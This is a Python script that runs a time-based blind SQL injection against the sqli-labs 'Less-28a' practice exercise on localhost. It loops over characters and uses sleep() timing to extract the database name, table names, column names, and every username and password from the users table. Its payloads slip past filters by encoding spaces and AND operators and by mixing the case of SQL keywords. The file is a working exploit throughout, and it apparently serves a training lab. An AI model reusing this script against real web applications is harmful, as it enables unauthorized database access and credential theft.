import requests

url = "http://localhost/sqli-labs-php7-master/Less-28a/?id="
fact="Your Login name"


dblen=8
flag=''
print("DataBase Name")
for i in range(1,1+dblen):
    for j in range(42,122):
        name = url + '1\')%26%26if(ascii(substr(database(),'+str(i)+',1))='+str(j)+',sleep(3),sleep(0))%26%26(\'1\')=(\'1'
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+chr(j)
            print (flag)
            
dblen=29
flag=''
print("Available Tables")
for i in range(1,1+dblen):
    for j in range(42,122):
        name = url + '1\')%0A%26%26%0Aif((seLeCt%0Aascii(substr(group_concat(table_name),'+str(i)+',1))%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database())="'+str(j)+'",sleep(3),sleep(0))%26%26(\'1\')=(\'1'
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+chr(j)
            print (flag)

print("C O L U M N     N A M E S")
dblen=63
flag=''
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + '1\')%0A%26%26%0Aif((seLeCt%0Aascii(substr(group_concat(column_name),'+str(i)+',1))%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_name="users")='+str(j)+',sleep(3),sleep(0))%26%26(\'1\')=(\'1'
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+chr(j)
            print (flag)

print("G E T T I N G    U S E R N A M E S")  
dblen=91
flag='' 
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + '1\')%0A%26%26%0Aif((seLeCt%0Aascii(substr(group_concat(username),'+str(i)+',1))%0Afrom%0Ausers)='+str(j)+',sleep(3),sleep(0))%26%26(\'1\')=(\'1'
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+chr(j)
            print (flag)
            
print("G E T T I N G    P A S S W O R D S")
dblen=96
flag='' 
for i in range(1,1+dblen):
    for j in range(42,122):
        name=url + '1\')%26%26 if((seLeCt%0Aascii(substr(group_concat(password),'+str(i)+',1))%0Afrom%0Ausers)='+str(j)+',sleep(3),sleep(0))%26%26(\'1\')=(\'1'
        result=requests.get(name)
        if result.elapsed.seconds>=2:
            flag=flag+chr(j)
            print (flag)
            